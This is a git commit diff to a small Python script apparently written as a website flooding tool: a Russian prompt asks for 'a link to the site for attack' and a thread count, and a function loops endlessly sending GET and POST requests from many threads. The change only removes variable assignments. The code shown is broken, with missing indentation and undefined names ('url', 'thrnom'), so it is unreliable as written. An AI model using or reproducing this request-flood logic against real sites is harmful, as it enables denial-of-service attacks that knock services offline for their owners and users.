b3b47c3acb9cdba6a3f4fe744262b15a8882265b
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-07-25 03:35:21 +0300

    Update gOfqbk.py

--- gOfqbk.py
+++ gOfqbk.py
@@ -8,8 +8,8 @@ targ = input("Введите ссылку на сайт для атаки: ")
 targ = input('Threads: ')
 def ddos():
 while True:
-  spam = requests.post(url)
-  spam2 = requests.get(url)
+  requests.post(url)
+  requests.get(url)
 for i in range(int(thrnom)):
 while True:
 threading.Thread(target=ddos).start()
